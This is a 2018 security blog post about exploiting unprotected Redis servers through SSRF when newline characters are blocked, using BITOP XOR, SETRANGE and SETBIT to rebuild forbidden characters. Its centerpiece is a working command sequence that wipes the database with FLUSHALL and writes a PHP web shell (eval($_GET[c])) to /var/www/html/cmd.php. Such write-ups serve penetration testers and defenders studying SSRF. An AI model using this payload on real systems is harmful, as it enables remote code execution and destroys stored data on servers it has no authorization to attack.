---
layout: post
title: "Redis SSRF exploits without new line"
date: 2018-07-15 16:06:06
tags: ssrf redis gopher
description: How to exploit redis via SSRF without using binary-safe version of redis protocol
comments: true
---

## About
There are a lot of articles, describing redis exploitation via http-based protocols. It might be a misconfigured reverse-proxy or SSRF vulnerability - whatever. But at the end every technique faces with one problem - we need to add spaces to our payloads, but sometimes this can be a tricky case.

## Binary-safe redis protocol
**Nicolas Gr√©goire** in his article ["Trying to hack Redis via HTTP requests"](http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) described almost everything you may need to successfully exploit not protected redis server. He also suggested to use [binary-safe version](https://redis.io/topics/protocol) of the redis protocol when we need to add spaces or another special characters into a payload.
It looks something like this:

```text
*1
$8
flushall
*3
$3
set
$1
1
$7
myvalue
```

Each command starts with <b>*</b> followed by number of command parts (keywords + arguments). Before sending each part in binary-safe manner we should specify number of bytes in the following string:
```
$7
myvalue
```
Every line is terminated by by CRLF (```%0d%0a```)

## So, what if we are not allowed to use \r\n?
It might be a bunch of reasons to forbid us to send these vital ```%0d0a```, but we might still need passwords or any other special characters in our payload. Is there another way to create our payload? 
Yes! Lets look into the redis documentation:

[**BITOP**](https://redis.io/commands/bitop) function allows us to perform bitwise operations between multiple keys:
```
BITOP AND destkey srckey1 srckey2 srckey3 ... srckeyN
BITOP OR destkey srckey1 srckey2 srckey3 ... srckeyN
BITOP XOR destkey srckey1 srckey2 srckey3 ... srckeyN
BITOP NOT destkey srckey
```
Using such a wonderful opportunity, we can recreate any character we need using those already available. For example, if we need space character:
```text
_set a1 F
_set a2 f
_BITOP XOR payload a1 a2
```
We'll get a space in our 'payload' at the end. So, now we can save our first php shell:
```text
_FLUSHALL 
_config set dir /var/www/html/ 
_set a1 ZY%16%0E%16F
_set a2 ffffff
_BITOP XOR payload a1 a2
_append payload eval($_GET[c]);%3f>
_config set dbfilename cmd.php 
_save
```
The 'payload' key will hold ```<?php ``` value with vitally needed space after it.

## What else can be useful? 
Have a look at these [redis commands](https://redis.io/commands):

[**SETRANGE**](https://redis.io/commands/setrange) - allows to insert given value to a desired position:
```text
redis>  SET key1 "Hello World"
"OK"
redis>  SETRANGE key1 6 "Redis"
(integer) 11
redis>  GET key1
"Hello Redis"
```

[**SETBIT**](https://redis.io/commands/setbit) - sets or clears the bit at needed offset:
```text
redis>  SETBIT mykey 7 1
(integer) 0
redis>  SETBIT mykey 7 0
(integer) 1
redis>  GET mykey
"\u0000"
```

## References
 - [Redis protocol](https://redis.io/topics/protocol)
 - [Trying to hack Redis via HTTP requests](http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)
 - [curl Based SSRF Exploits Against Redis](https://maxchadwick.xyz/blog/ssrf-exploits-against-redis)
 - [From SSRF to getshell with Redis Unauthorized](http://1person.me/2017-12-01-How-to-write-shell-with-redis-unauthorized/)
 - [Redis SSRF](https://xz.aliyun.com/t/1800)
 - [Gopher attack surfaces](https://blog.chaitin.cn/gopher-attack-surfaces/)

### Good luck and happy hacking!